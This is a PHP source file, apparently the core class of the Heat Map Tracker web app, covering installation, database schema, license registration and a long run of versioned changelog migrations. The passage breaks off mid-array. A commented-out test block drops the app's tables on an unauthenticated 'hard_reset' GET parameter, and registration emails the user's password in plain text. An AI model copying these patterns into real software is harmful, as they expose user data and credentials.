<?php
/*
 * Heat Map Tracker Developer License
 * (c) 2013. HeatMapTracker 
 * http://HeatMapTracker.com
 */
if ( ! isset( $_SESSION ) ) {
	session_start();
}
error_reporting( 0 );
ini_set( 'display_errors', 0 );
ini_set( 'log_errors', 0 );

// Debug Paypal transaction using paypal sandbox
define( 'PAYPAL_DEBUG', false );
define( 'CURRENT_VERSION', "2.9.4" );
define( 'COOKIE_EXPIRY', 3600 ); // 3600 = 1 hour

$plans = array(
	"hmt-agency",
	"hmt-agency-discount",
	"hmt-agency-lifetime",
	"hmt-agency-monthly",
	"hmt-agency-yearly",
	"pp-hmt-agency",
	"hmt-agency-lifetime-viberspy"
);

class HMTrackerPro_class {

	var $PLUGIN_URL;
	var $PLUGIN_PATH;
	var $MARKUP_PATH;
	var $FUNCTIONS_PATH;

	var $PAYPAL_URL;
	var $UPDATE_URL;

	var $OPTION_NAME;
	var $OPTIONS;

	var $PROJECTS_NAME;
	var $PROJECTS;

	var $PACKAGES_NAME;
	var $PACKAGES;

	var $USERSTATUS_NAME;
	var $USERSTATUS;

	var $USER_DOMAINS_NAME;
	var $USER_DOMAINS;

	var $BANNED_LOGINS_NAME;
	var $BANNED_LOGINS;

	var $VIBER_INIT;
	var $MAIN_STR;
	var $MEMORY_ERROR;
	var $UpdateChecker;

	public function __construct() {
		define( 'HMT_STARTED', true );
		define( 'LOGIN_ATTEMPTS', 4 );
		define( 'HMT_LOG_IPN', true );

		$this->PLUGIN_PATH        = dirname( __FILE__ ) . DIRECTORY_SEPARATOR;
		$this->OPTION_NAME        = "heatmaptracker";
		$this->PROJECTS_NAME      = "heatmaptracker_projects";
		$this->BANNED_LOGINS_NAME = "heatmaptracker_banned_logins";
		$this->UPDATE_URL         = "http://heatmaptracker.com/update/developer.update";
		$this->PACKAGES_NAME      = "heatmaptracker_packages";
		$this->PLANS_NAME         = "heatmaptracker_plans";
		$this->USERSTATUS_NAME    = "heatmaptracker_userstatuses";
		$this->USER_DOMAINS_NAME  = "heatmaptracker_user_domains";
		$this->MARKUP_PATH        = $this->PLUGIN_PATH . 'includes/markup/';
		$this->FUNCTIONS_PATH     = $this->PLUGIN_PATH . 'includes/functions/';

		require_once( dirname( __FILE__ ) . '/includes/functions/fn-functions.php' );
		$this->PLUGIN_URL = admin_url();

		$GLOBALS["HMTrackerPro_PLUGIN_PATH"]        = $this->PLUGIN_PATH;
		$GLOBALS["HMTrackerPro_PLUGIN_URL"]         = $this->PLUGIN_URL;
		$GLOBALS["HMTrackerPro_OPTION_NAME"]        = $this->OPTION_NAME;
		$GLOBALS["HMTrackerPro_BANNED_LOGINS_NAME"] = $this->BANNED_LOGINS_NAME;
		$GLOBALS["HMTrackerPro_PACKAGES_NAME"]      = $this->PACKAGES_NAME;
		$GLOBALS["HMTrackerPro_PROJECTS_NAME"]      = $this->PROJECTS_NAME;
		$GLOBALS["HMTrackerPro_USERSTATUS_NAME"]    = $this->USERSTATUS_NAME;
		$GLOBALS["HMTrackerPro_USER_DOMAINS_NAME"]  = $this->USER_DOMAINS_NAME;
		$GLOBALS['loggedin_user']                   = array();

		$this->hmtrackerspy_registerConfig();

		if ( defined( 'PAYPAL_DEBUG' ) && PAYPAL_DEBUG ) {
			$this->PAYPAL_URL = "https://www.sandbox.paypal.com/cgi-bin/webscr";
		} else {
			$this->PAYPAL_URL = "https://www.paypal.com/cgi-bin/webscr";
		}

	}

	#-------------------------------------------------------------------------------------------
	public function hmtrackerspy_install() { #install plugin
		#-------------------------------------------------------------------------------------------
		//echo "2 ";

		$option = $this->OPTIONS;
		if ( false === $option ) {


			$option                         = array();
			$option['software']             = "Heat Map Tracker Developer License";
			$option['update']               = time();
			$option['key']                  = md5( time() . time() . time() . time() . time() );
			$option['version']              = CURRENT_VERSION;
			$option['last_info']            = "";
			$option['changelog']            = array(
				"2.8.6"   => array(
					"Fix 1" => "Servers with `magic quotes` enabled unable to login.",
					"Fix 2" => "Servers with `magic quotes` enabled unable getting `no tracking data` when viewing heatmaps.",
				),
				"2.8.7"   => array(
					"Fix 1" => "Issue when clicking `Return to Admin` not working",
				),
				"2.8.8"   => array(
					"Fix 1" => "Viewing non secure user session pages from secure site and vice versa not working"
				),
				"2.9.0"   => array(
					"Fix 1" => "Made the height of the website iframe the same height as the canvas iframe.",
					"Fix 2" => "Upgraded to new version of heatmap.js.",
				),
				"2.9.1"   => array(
					"Fix 1" => "Fixed issue where scroll heatmap not showing full page of tracked site",
				),
				"2.9.2"   => array(
					"Fix 1" => "On some servers the popluar pages data was not been captured at all",
				),
				"2.9.4"   => array(
					"Fix 1" => "Project->User Sessions: Very long pages not showing in their entirety",
				)
			);
			$option['dbtable_name']         = "heatmaptracker";
			$option['dbtable_name_clicks']  = "heatmaptracker_clicks";
			$option['dbtable_name_mmove']   = "heatmaptracker_mmove";
			$option['dbtable_name_scroll']  = "heatmaptracker_scroll";
			$option['dbtable_name_popular'] = "heatmaptracker_popular";

			$option['dbtable_name_users']    = "heatmaptracker_users";
			$option['dbtable_name_payments'] = "heatmaptracker_payments";
			$option['dbtable_name_ipn']      = "heatmaptracker_ipn_log";

			$option['opt_record_all'] = "true";
			$option['license_key']    = "";
			$option['license']        = "";
			$option['restore_key']    = array();
			$option['brandname']      = "Heat Map Tracker";
			$option['brandlogo']      = $this->PLUGIN_URL . "images/hmtracker-logo.png";
			$option["brandblogo"]     = $this->PLUGIN_URL . "images/logo-big.png";
			$option['brandsupport']   = "http://support.digitalkickstart.com/";
			$option['help_area']      = "&lt;iframe width=&quot;800&quot; height=&quot;600&quot; src=&quot;//www.youtube.com/embed/ubiH3nK0YHk&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;";
			global $wpdb;

			$table_users = T_PREFIX . $option['dbtable_name_users'];
			$structure   = "CREATE TABLE IF NOT EXISTS $table_users (
					      id int(12) NOT NULL AUTO_INCREMENT,
					      email VARCHAR(200) DEFAULT '' NOT NULL,
					      password VARCHAR(200) DEFAULT '' NOT NULL,
					      business_name VARCHAR(200) DEFAULT '' NOT NULL,
					      website VARCHAR(200) DEFAULT '' NOT NULL,
					      user_key VARCHAR(200) DEFAULT '' NOT NULL,
					      plans text,
					      status int(3) NOT NULL,
					      last_status_check bigint(99) NULL,
					      KEY email (email),
					      KEY password (password),
					      KEY user_key (user_key),
						  PRIMARY KEY (`id`)
						    ) ENGINE=MyISAM;";
			$wpdb->query( $structure );

			$table_payments = T_PREFIX . $option['dbtable_name_payments'];
			$structure      = "CREATE TABLE IF NOT EXISTS $table_payments (
						  `id` bigint(20) NOT NULL AUTO_INCREMENT,
						  `txnid` varchar(20) NOT NULL,
						  `payment_amount` decimal(7,2) NOT NULL,
						  `payment_status` varchar(25) NOT NULL,
						  `txn_type` varchar(25) NULL,
						  `createdtime` datetime NOT NULL,
						  `user` VARCHAR(200) DEFAULT '' NOT NULL,
						  `user_id` bigint(20) NOT NULL,
						  `plan_id` varchar(32) NULL,
						  PRIMARY KEY (`id`),
						  KEY(`user_id`),
						  KEY(`plan_id`)
						) ENGINE=MyISAM;";
			$wpdb->query( $structure );

			$table_options = T_PREFIX . "options";
			$structure6    = "CREATE TABLE IF NOT EXISTS $table_options (
					      name VARCHAR(150) DEFAULT '' NOT NULL,
					      data text NOT NULL,
					      UNIQUE KEY name (name)
					    )  ENGINE=MyISAM;";
			$wpdb->query( $structure6 );

			$table_ipn     = T_PREFIX . $option['dbtable_name_ipn'];
			$structure_ipn = "CREATE TABLE {$table_ipn} (
					`log_id` bigint(20) NOT NULL AUTO_INCREMENT,
					`tx_id` bigint(20) NOT NULL,
					`user_id` bigint(20) NOT NULL,
					`pay_email` varchar(100) NOT NULL,
					`paysys` varchar(100) NOT NULL DEFAULT 'paypal',
					`status` tinyint(1) NOT NULL,
					`postdata` longtext NOT NULL,
					`date` int(11) NOT NULL,
					UNIQUE KEY id (log_id)
	    		)  ENGINE=MyISAM DEFAULT CHARSET=utf8;";
			$wpdb->query( $structure_ipn );


			add_option( $this->OPTION_NAME, $option );
			$this->OPTIONS = $option;

			//packages
			$packages = $this->PACKAGES;
			if ( false === $packages ) {
				$packages = array();
				add_option( $this->PACKAGES_NAME, $packages );
				$this->PACKAGES = $packages;
			}

			//banned login ips
			$loginbans = $this->BANNED_LOGINS;
			if ( false === $loginbans ) {
				$loginbans = array();
				add_option( $this->BANNED_LOGINS_NAME, $loginbans );
				$this->BANNED_LOGINS = $loginbans;
			}
		}
	}

	#-------------------------------------------------------------------------------------------
	public function hmtrackerspy_uninstaller() { #uninstall plugin
		#-------------------------------------------------------------------------------------------
		//FOR TESTS ONLY!!!!! ==>
		/* if(isset($_GET['hard_reset'])) {
		$option = $this->OPTIONS;
		global $wpdb;
		$table_users 			= T_PREFIX.$option['dbtable_name_users'];
		$table_payments			= T_PREFIX.$option['dbtable_name_payments'];
		$table_options=  T_PREFIX."options";
		$table_ipn			= T_PREFIX.$option['dbtable_name_ipn_log'];

		$structure = "DROP TABLE IF EXISTS $table_users";
		$structure1 = "DROP TABLE IF EXISTS $table_payments";
		$structure5 = "DROP TABLE IF EXISTS $table_options";
		$structure6 = "DROP TABLE IF EXISTS `heatmaptracker_ipn_log`";

		$wpdb->query($structure);
		$wpdb->query($structure1);
		$wpdb->query($structure5);
		$wpdb->query($structure6);	}
		 */
		//<==FOR TESTS ONLY!!!!!
	}

	#-------------------------------------------------------------------------------------------
	function checkDB( $config, $no_check = false ) {

		$errors = array();
		if ( ! $no_check ) {
			@mysql_connect( $config['db_host'], $config['db_user'], $config['db_password'] ) or ( $errors[] = "DATABASE CONNECT ERROR: <p>Can't connect to the database using provided data. </p><p>Please check your connection settings and that your server firewall is not blocking outgoing requests on port " . $config['db_port'] . "</p>" );
			if ( empty( $errors ) ) {
				@mysql_select_db( $config['db_name'] ) or ( $errors[] = "Can't select database with name " . $config['db_name'] );
			}
		}
		if ( empty( $errors ) ) {
			if ( ! $no_check ) {
				// Database settings correct so write config file since this is not an rds install
				$errors = writeDatabaseConfig( $this->PLUGIN_PATH . 'config.php', $config );
			}
			if ( empty( $errors ) ) {
				// Successful config write so update license and user details
				require_once( $this->PLUGIN_PATH . 'includes/db/db.class.php' );
				require_once( $this->PLUGIN_PATH . 'config.php' );
				$GLOBALS["wpdb"] = new DB( DB_NAME, DB_HOST, DB_USER, DB_PASSWORD );
				$this->OPTIONS   = false;
				$this->hmtrackerspy_install();
			}
		}

		return $errors;
	}

	#-------------------------------------------------------------------------------------------
	function hmtRegisterPlugin( $post, $plugin_path, $nodb = false ) {
		// Register the license
		$response = json_decode( registerPlugin( trim( $post['license'] ) ) );

		$errors = array();
		if ( isset( $response->error ) ) {
			// Error so reset to register and add to errors array
			$errors[] = $response->error;
		} elseif ( isset( $response->success ) ) {
			if ( ! $nodb ) {
				$errors = writeMailConfig( $plugin_path . 'mail_config.php' );
			}
			if ( empty( $errors ) ) {
				$file = $plugin_path . 'mail_config.php';
				if ( ! file_exists( $file ) ) {
					$errors[] = "Config file 'mail_config.php' not found!";
				} else {
					require_once( $file );
					wp_maill( $post["email"], "Your Product Was Registered Successfully", "Congratulations! Your Product Was Registered Successfully \n\Email Address: " . $post["email"] . "\npassword:" . $post["pass1"] . "\n\nHeat Map Tracker\n" . admin_url() );
					if ( ! isset( $post['use_rds'] ) ) {
						// Try connecting to database
						$errors = $this->checkDB( $post, $nodb );
						if ( empty( $errors ) ) {
							updateUserDetails( trim( $post['license'] ) );
							header( "Location: " . home_url() );
							die();
						}
					}
				}
			}
		}

		return $errors;
	}

	#-------------------------------------------------------------------------------------------
	public function hmtrackerspy_reinstall() { #apply updates
		#-------------------------------------------------------------------------------------------
		//echo "4 ";

		$changed = false;
		$option  = $this->OPTIONS;
		if ( version_compare( $option['version'], '2.1.06', '<' ) ) {

			$option['help_area'] = "%3Ciframe%20width%3D%22800%22%20height%3D%22600%22%20src%3D%22%2F%2Fwww.youtube.com%2Fembed%2FubiH3nK0YHk%22%20frameborder%3D%220%22%20allowfullscreen%3E%3C%2Fiframe%3E%0A";
			$changed             = true;
		}
		if ( version_compare( $option['version'], '2.1.10', '<' ) ) {
			global $wpdb;
			$option['version']   = "2.1.10";
			$option['changelog'] = array(
				"2.1.09" => array(
					"Fix" => "Session Player Cursor",
					"Fix" => "Sessions Time"
				),
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
			);

			$q = "SELECT * FROM `" . T_PREFIX . $option['dbtable_name_users'] . "`";
			$r = $wpdb->query( $q );
			while ( $a = mysql_fetch_assoc( $r ) ) {

				$table          = T_PREFIX . 'main_' . $a["user_key"];
				$table_click    = T_PREFIX . 'clicks_' . $a["user_key"];
				$table_mmove    = T_PREFIX . 'mmove_' . $a["user_key"];
				$table_scroll   = T_PREFIX . 'scroll_' . $a["user_key"];
				$table_ppopular = T_PREFIX . 'popular_' . $a["user_key"];

				$q1 = "ALTER TABLE $table ENGINE = InnoDB";
				$q2 = "ALTER TABLE $table_click ENGINE = InnoDB";
				$q3 = "ALTER TABLE $table_mmove ENGINE = InnoDB";
				$q4 = "ALTER TABLE $table_scroll ENGINE = InnoDB";
				$q5 = "ALTER TABLE $table_ppopular ENGINE = InnoDB";

				$wpdb->query( $q1 );
				usleep( 100000 );
				$wpdb->query( $q2 );
				usleep( 100000 );
				$wpdb->query( $q3 );
				usleep( 100000 );
				$wpdb->query( $q4 );
				usleep( 100000 );
				$wpdb->query( $q5 );

			}
			$changed = true;

		}
		if ( version_compare( $option['version'], '2.1.12', '<' ) ) {

			$option['version']   = "2.1.12";
			$option['changelog'] = array(
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
				"2.1.11" => array(
					"Fix" => "Allowed Domains"
				),
				"2.1.12" => array(
					"Fix" => "Player Title and Mouse",
				)
			);
			$changed             = true;
		}

		if ( version_compare( $option['version'], '2.1.20', '<' ) ) {
			$option['version']   = "2.1.20";
			$option['changelog'] = array(
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
				"2.1.11" => array(
					"Fix" => "Allowed Domains"
				),
				"2.1.12" => array(
					"Fix" => "Player Title and Mouse",
				),
				"2.1.20" => array(
					"Fix 1" => "Data Total Size",
					"Fix 2" => "Spelling in projects list (Sessions)",
					"Fix 3" => "User settings now showing user email",
					"Fix 4" => "Heatmaps - Moved calculations to server",
					"New"   => "Option to ignore query strings in page url. (gclib removed by default)"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.1.21', '<' ) ) {
			$option['version']   = "2.1.21";
			$option['changelog'] = array(
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
				"2.1.11" => array(
					"Fix" => "Allowed Domains"
				),
				"2.1.12" => array(
					"Fix" => "Player Title and Mouse",
				),
				"2.1.20" => array(
					"Fix 1" => "Data Total Size",
					"Fix 2" => "Spelling in projects list (Sessions)",
					"Fix 3" => "User settings now showing user email",
					"Fix 4" => "Heatmaps - Moved calculations to server",
					"New"   => "Option to ignore query strings in page url. (gclib removed by default)"
				),
				"2.1.21" => array(
					"Fix 1" => "Removed captcha validation from login",
					"Fix 2" => "Fixed is_user_logged_in function misspelt in compressed bin file",
					"Fix 3" => "Added validation for SPY_URL in registerPlugin function",
					"Fix 4" => "Added check to not include error.log file in site backup when doing automatic updates"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.1.22', '<' ) ) {
			$option['version']   = "2.1.22";
			$option['changelog'] = array(
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
				"2.1.11" => array(
					"Fix" => "Allowed Domains"
				),
				"2.1.12" => array(
					"Fix" => "Player Title and Mouse",
				),
				"2.1.20" => array(
					"Fix 1" => "Data Total Size",
					"Fix 2" => "Spelling in projects list (Sessions)",
					"Fix 3" => "User settings now showing user email",
					"Fix 4" => "Heatmaps - Moved calculations to server",
					"New"   => "Option to ignore query strings in page url. (gclib removed by default)"
				),
				"2.1.21" => array(
					"Fix 1" => "Removed captcha validation from login",
					"Fix 2" => "Fixed is_user_logged_in function misspelt in compressed bin file",
					"Fix 3" => "Added validation for SPY_URL in registerPlugin function",
					"Fix 4" => "Added check to not include error.log file in site backup when doing automatic updates"
				),
				'2.1.22' => array(
					"Fix" => "Fixed js script format breaking user pages",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.1.23', '<' ) ) {
			$option['version']   = "2.1.23";
			$option['changelog'] = array(
				"2.1.10" => array(
					"Fix" => "Database Table Locking"
				),
				"2.1.11" => array(
					"Fix" => "Allowed Domains"
				),
				"2.1.12" => array(
					"Fix" => "Player Title and Mouse",
				),
				"2.1.20" => array(
					"Fix 1" => "Data Total Size",
					"Fix 2" => "Spelling in projects list (Sessions)",
					"Fix 3" => "User settings now showing user email",
					"Fix 4" => "Heatmaps - Moved calculations to server",
					"New"   => "Option to ignore query strings in page url. (gclib removed by default)"
				),
				"2.1.21" => array(
					"Fix 1" => "Removed captcha validation from login",
					"Fix 2" => "Fixed is_user_logged_in function misspelt in compressed bin file",
					"Fix 3" => "Added validation for SPY_URL in registerPlugin function",
					"Fix 4" => "Added check to not include error.log file in site backup when doing automatic updates"
				),
				'2.1.22' => array(
					"Fix" => "Fixed js script format breaking user pages",
				),
				'2.1.23' => array(
					"Fix" => "License activation failures.",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.1.24', '<' ) ) {
			$option['version']      = "2.1.24";
			$option['brandsupport'] = "http://support.digitalkickstart.com/";
			$option['changelog']    = array(
				"2.1.20" => array(
					"Fix 1" => "Data Total Size",
					"Fix 2" => "Spelling in projects list (Sessions)",
					"Fix 3" => "User settings now showing user email",
					"Fix 4" => "Heatmaps - Moved calculations to server",
					"New"   => "Option to ignore query strings in page url. (gclib removed by default)"
				),
				"2.1.21" => array(
					"Fix 1" => "Removed captcha validation from login",
					"Fix 2" => "Fixed is_user_logged_in function misspelt in compressed bin file",
					"Fix 3" => "Added validation for SPY_URL in registerPlugin function",
					"Fix 4" => "Added check to not include error.log file in site backup when doing automatic updates"
				),
				'2.1.22' => array(
					"Fix" => "Fixed js script format breaking user pages",
				),
				'2.1.23' => array(
					"Fix" => "License activation failures.",
				),
				'2.1.24' => array(
					"Update" => "New support url",
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.5', '<' ) ) {
			$option['version']   = "2.5";
			$option['changelog'] = array(
				"2.1.21" => array(
					"Fix 1" => "Removed captcha validation from login",
					"Fix 2" => "Fixed is_user_logged_in function misspelt in compressed bin file",
					"Fix 3" => "Added validation for SPY_URL in registerPlugin function",
					"Fix 4" => "Added check to not include error.log file in site backup when doing automatic updates"
				),
				'2.1.22' => array(
					"Fix" => "Fixed js script format breaking user pages",
				),
				'2.1.23' => array(
					"Fix" => "License activation failures.",
				),
				'2.1.24' => array(
					"Update" => "New support url",
				),
				'2.5'    => array(
					"Update 1" => "Improved error message from ajax request",
					"Update 2" => "Upgraded to new heatmap library for faster processing of data.",
					"Fix 1"    => "Fixed syntax error in library bin file",
					"Fix 2"    => "Corrected spelling errors",
					"Fix 3"    => "Ignore Query String option now being saved correctly",
					"Fix 4"    => "Currency not being saved when adding/editing packages",
					"Fix 5"    => "DB Size calculations",
					"Fix 6"    => "Deregistration button now works",
					"New 1"    => "Clicking on Forgotten Password now unbanns IP address as well."
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.5.1', '<' ) ) {
			$option['version']   = "2.5.1";
			$option['changelog'] = array(
				'2.1.22' => array(
					"Fix" => "Fixed js script format breaking user pages",
				),
				'2.1.23' => array(
					"Fix" => "License activation failures.",
				),
				'2.1.24' => array(
					"Update" => "New support url",
				),
				'2.5'    => array(
					"Update 1" => "Improved error message from ajax request",
					"Update 2" => "Upgraded to new heatmap library for faster processing of data.",
					"Fix 1"    => "Fixed syntax error in library bin file",
					"Fix 2"    => "Corrected spelling errors",
					"Fix 3"    => "Ignore Query String option now being saved correctly",
					"Fix 4"    => "Currency not being saved when adding/editing packages",
					"Fix 5"    => "DB Size calculations",
					"Fix 6"    => "Deregistration button now works",
					"New 1"    => "Clicking on Forgotten Password now unbanns IP address as well."
				),
				'2.5.1'  => array(
					'Fix 1' => 'Removed support url override',
					'Fix 2' => 'Scroll Heatmap not working and some tracked website javascript was breaking'
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.6.0', '<' ) ) {
			$option['version']   = "2.6.0";
			$option['changelog'] = array(
				'2.5'   => array(
					"Update 1" => "Improved error message from ajax request",
					"Update 2" => "Upgraded to new heatmap library for faster processing of data.",
					"Fix 1"    => "Fixed syntax error in library bin file",
					"Fix 2"    => "Corrected spelling errors",
					"Fix 3"    => "Ignore Query String option now being saved correctly",
					"Fix 4"    => "Currency not being saved when adding/editing packages",
					"Fix 5"    => "DB Size calculations",
					"Fix 6"    => "Deregistration button now works",
					"New 1"    => "Clicking on Forgotten Password now unbanns IP address as well."
				),
				'2.5.1' => array(
					'Fix 1' => 'Removed support url override',
					'Fix 2' => 'Scroll Heatmap not working and some tracked website javascript was breaking'
				),
				'2.6.0' => array(
					'Fix 1'    => 'Several bug fixes and structure rebuilds',
					'Fix 2'    => 'Typo: "By clickinng..." - "Clickinng" on Change Package view',
					'Fix 3'    => 'License validation no longer includes the scheme of the SPY_URL so now registration works for both http and https',
					'Fix 4'    => 'Fix bug with any package allowing unlimited domains to be added by users',
					'Fix 5'    => 'Rebuild upgrade/downgrade package functionality (this was incomplete and non-functional to begin with)',
					'Update 1' => '*** THIS WILL REQUIRE RE-REGISTRATION *** <br />Tracking and reporting of secure AND non-secure pages now possible. The customer MUST have a VALID, REGISTERED SSL Certificate installed on the HMT install domain',
					'Update 2' => 'Change "Username" to "Email Address" on login page',
					'New 1'    => 'Include Annual Payment Option in packages'
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.7.0', '<' ) ) {
			$option['version']   = "2.7.0";
			$option['changelog'] = array(
				'2.5'   => array(
					"Update 1" => "Improved error message from ajax request",
					"Update 2" => "Upgraded to new heatmap library for faster processing of data.",
					"Fix 1"    => "Fixed syntax error in library bin file",
					"Fix 2"    => "Corrected spelling errors",
					"Fix 3"    => "Ignore Query String option now being saved correctly",
					"Fix 4"    => "Currency not being saved when adding/editing packages",
					"Fix 5"    => "DB Size calculations",
					"Fix 6"    => "Deregistration button now works",
					"New 1"    => "Clicking on Forgotten Password now unbanns IP address as well."
				),
				'2.5.1' => array(
					'Fix 1' => 'Removed support url override',
					'Fix 2' => 'Scroll Heatmap not working and some tracked website javascript was breaking'
				),
				'2.6.0' => array(
					'Fix 1'    => 'Several bug fixes and structure rebuilds',
					'Fix 2'    => 'Typo: "By clickinng..." - "Clickinng" on Change Package view',
					'Fix 3'    => 'License validation no longer includes the scheme of the SPY_URL so now registration works for both http and https',
					'Fix 4'    => 'Fix bug with any package allowing unlimited domains to be added by users',
					'Fix 5'    => 'Rebuild upgrade/downgrade package functionality (this was incomplete and non-functional to begin with)',
					'Update 1' => '*** THIS WILL REQUIRE RE-REGISTRATION *** <br />Tracking and reporting of secure AND non-secure pages now possible. The customer MUST have a VALID, REGISTERED SSL Certificate installed on the HMT install domain',
					'Update 2' => 'Change "Username" to "Email Address" on login page',
					'New 1'    => 'Include Annual Payment Option in packages'
				),
				'2.7.0' => array(
					"New 1" => 'Added ability to create free trial packages',
					"New 2" => 'Added ability to create free packages (set all values to 0)',
					"New 3" => 'Can now manually activate/suspend users',
					"Fix 1" => 'Admin Settings now a form submit, not an AJAX call (was causing 406 Not Allowed errors on some hosting providers)',
					"Fix 2" => "User can no longer downgrade to package that has a domain limit is less than user current active projects"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.7.1', '<' ) ) {
			$option['version']   = "2.7.1";
			$option['changelog'] = array(
				'2.5.1' => array(
					'Fix 1' => 'Removed support url override',
					'Fix 2' => 'Scroll Heatmap not working and some tracked website javascript was breaking'
				),
				'2.6.0' => array(
					'Fix 1'    => 'Several bug fixes and structure rebuilds',
					'Fix 2'    => 'Typo: "By clickinng..." - "Clickinng" on Change Package view',
					'Fix 3'    => 'License validation no longer includes the scheme of the SPY_URL so now registration works for both http and https',
					'Fix 4'    => 'Fix bug with any package allowing unlimited domains to be added by users',
					'Fix 5'    => 'Rebuild upgrade/downgrade package functionality (this was incomplete and non-functional to begin with)',
					'Update 1' => '*** THIS WILL REQUIRE RE-REGISTRATION *** <br />Tracking and reporting of secure AND non-secure pages now possible. The customer MUST have a VALID, REGISTERED SSL Certificate installed on the HMT install domain',
					'Update 2' => 'Change "Username" to "Email Address" on login page',
					'New 1'    => 'Include Annual Payment Option in packages'
				),
				'2.7.0' => array(
					"New 1" => 'Added ability to create free trial packages',
					"New 2" => 'Added ability to create free packages (set all values to 0)',
					"New 3" => 'Can now manually activate/suspend users',
					"Fix 1" => 'Admin Settings now a form submit, not an AJAX call (was causing 406 Not Allowed errors on some hosting providers)',
					"Fix 2" => "User can no longer downgrade to package that has a domain limit is less than user current active projects"
				),
				'2.7.1' => array(
					"Fix 1" => 'BUG: Free users were being limited as if assigned to a package'
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.7.2', '<' ) ) {
			$option['version']   = "2.7.2";
			$option['changelog'] = array(
				'2.5.1' => array(
					'Fix 1' => 'Removed support url override',
					'Fix 2' => 'Scroll Heatmap not working and some tracked website javascript was breaking'
				),
				'2.6.0' => array(
					'Fix 1'    => 'Several bug fixes and structure rebuilds',
					'Fix 2'    => 'Typo: "By clickinng..." - "Clickinng" on Change Package view',
					'Fix 3'    => 'License validation no longer includes the scheme of the SPY_URL so now registration works for both http and https',
					'Fix 4'    => 'Fix bug with any package allowing unlimited domains to be added by users',
					'Fix 5'    => 'Rebuild upgrade/downgrade package functionality (this was incomplete and non-functional to begin with)',
					'Update 1' => '*** THIS WILL REQUIRE RE-REGISTRATION *** <br />Tracking and reporting of secure AND non-secure pages now possible. The customer MUST have a VALID, REGISTERED SSL Certificate installed on the HMT install domain',
					'Update 2' => 'Change "Username" to "Email Address" on login page',
					'New 1'    => 'Include Annual Payment Option in packages'
				),
				'2.7.0' => array(
					"New 1" => 'Added ability to create free trial packages',
					"New 2" => 'Added ability to create free packages (set all values to 0)',
					"New 3" => 'Can now manually activate/suspend users',
					"Fix 1" => 'Admin Settings now a form submit, not an AJAX call (was causing 406 Not Allowed errors on some hosting providers)',
					"Fix 2" => "User can no longer downgrade to package that has a domain limit is less than user current active projects"
				),
				'2.7.1' => array(
					"Fix 1" => 'BUG: Free users were being limited as if assigned to a package'
				),
				'2.7.2' => array(
					"Update 1" => 'Removed add domain from user account settings if no package linked or override active user',
					"Fix 1"    => "Enable tracking for override active user"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.7.3', '<' ) ) {
			$option['version']   = "2.7.3";
			$option['changelog'] = array(
				'2.6.0' => array(
					'Fix 1'    => 'Several bug fixes and structure rebuilds',
					'Fix 2'    => 'Typo: "By clickinng..." - "Clickinng" on Change Package view',
					'Fix 3'    => 'License validation no longer includes the scheme of the SPY_URL so now registration works for both http and https',
					'Fix 4'    => 'Fix bug with any package allowing unlimited domains to be added by users',
					'Fix 5'    => 'Rebuild upgrade/downgrade package functionality (this was incomplete and non-functional to begin with)',
					'Update 1' => '*** THIS WILL REQUIRE RE-REGISTRATION *** <br />Tracking and reporting of secure AND non-secure pages now possible. The customer MUST have a VALID, REGISTERED SSL Certificate installed on the HMT install domain',
					'Update 2' => 'Change "Username" to "Email Address" on login page',
					'New 1'    => 'Include Annual Payment Option in packages'
				),
				'2.7.0' => array(
					"New 1" => 'Added ability to create free trial packages',
					"New 2" => 'Added ability to create free packages (set all values to 0)',
					"New 3" => 'Can now manually activate/suspend users',
					"Fix 1" => 'Admin Settings now a form submit, not an AJAX call (was causing 406 Not Allowed errors on some hosting providers)',
					"Fix 2" => "User can no longer downgrade to package that has a domain limit is less than user current active projects"
				),
				'2.7.1' => array(
					"Fix 1" => 'BUG: Free users were being limited as if assigned to a package'
				),
				'2.7.2' => array(
					"Update 1" => 'Removed add domain from user account settings if no package linked or override active user',
					"Fix 1"    => "Enable tracking for override active user"
				),
				'2.7.3' => array(
					"Fix 1" => "Fixed: Admin Settings Corrupting Options file",
					"Fix 2" => "Change style of Project JS script"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.7.4', '<' ) ) {
			$option['version']   = "2.7.4";
			$option['changelog'] = array(
				'2.7.0' => array(
					"New 1" => 'Added ability to create free trial packages',
					"New 2" => 'Added ability to create free packages (set all values to 0)',
					"New 3" => 'Can now manually activate/suspend users',
					"Fix 1" => 'Admin Settings now a form submit, not an AJAX call (was causing 406 Not Allowed errors on some hosting providers)',
					"Fix 2" => "User can no longer downgrade to package that has a domain limit is less than user current active projects"
				),
				'2.7.1' => array(
					"Fix 1" => 'BUG: Free users were being limited as if assigned to a package'
				),
				'2.7.2' => array(
					"Update 1" => 'Removed add domain from user account settings if no package linked or override active user',
					"Fix 1"    => "Enable tracking for override active user"
				),
				'2.7.3' => array(
					"Fix 1" => "Fixed: Admin Settings Corrupting Options file",
					"Fix 2" => "Change style of Project JS script"
				),
				'2.7.4' => array(
					"Fix 1" => "Fixed issue when project name had a space in the name - js would not load"
				)
			);

			$changed = true;
		}

		if ( version_compare( $option['version'], '2.8.0', '<' ) ) {
			$option['version']   = "2.8.0";
			$option['changelog'] = array(
				'2.7.1' => array(
					"Fix 1" => 'BUG: Free users were being limited as if assigned to a package'
				),
				'2.7.2' => array(
					"Update 1" => 'Removed add domain from user account settings if no package linked or override active user',
					"Fix 1"    => "Enable tracking for override active user"
				),
				'2.7.3' => array(
					"Fix 1" => "Fixed: Admin Settings Corrupting Options file",
					"Fix 2" => "Change style of Project JS script"
				),
				'2.7.4' => array(
